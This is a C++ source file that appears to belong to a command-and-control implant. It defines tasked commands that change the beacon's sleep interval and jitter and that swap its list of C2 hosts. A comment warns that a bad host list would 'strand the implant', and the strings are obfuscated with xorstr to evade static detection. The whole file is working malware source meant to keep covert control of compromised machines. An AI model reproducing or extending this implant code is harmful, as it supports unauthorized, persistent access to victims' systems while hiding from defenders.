// ========================================== { START OF FILE } ========================================== //
#include "agent/commands/exec/scheduling.h"

#include <string>

#include "agent/commands/command_result.h"
#include "agent/runtime/schedule.h"
#include "agent/transport/comm_manager.h"
#include "xorstr/xorstr.hpp"

namespace agent::commands::exec {

    CommandResult SetSleep(const models::CheckinResponse& task) {
        if (task.sleep_ms <= 0) {
            return CommandResult::Error(xorstr_("Set sleep: Command.Sleep was missing or not positive"));
        }

        runtime::Schedule::Instance().Set(task.sleep_ms, task.jitter);
        return CommandResult::Ok(xorstr_("Sleep set to ") + std::to_string(task.sleep_ms) + xorstr_(" ms (jitter ") +
                                 std::to_string(task.jitter) + xorstr_("%)"));
    }

    CommandResult UpdateHosts(const models::CheckinResponse& task) {
        if (task.hosts.empty()) {
            return CommandResult::Error(xorstr_("Update hosts: Command.Hosts was empty"));
        }

        // The list replaces the compiled-in one: the first entry is the address the next
        // check-in goes to, so an empty or malformed list would strand the implant.
        std::vector<std::string> hosts;
        for (const std::string& host : task.hosts) {
            if (!host.empty()) {
                hosts.push_back(host);
            }
        }

        if (hosts.empty()) {
            return CommandResult::Error(xorstr_("Update hosts: no usable host in Command.Hosts"));
        }

        agent::transport::SetHosts(hosts);
        std::string joined;
        for (const std::string& host : hosts) {
            joined += (joined.empty() ? "" : ", ") + host;
        }
        return CommandResult::Ok(xorstr_("C2 hosts set to: ") + joined);
    }

}  // namespace agent::commands::exec
// ========================================== { END OF FILE } ========================================== //
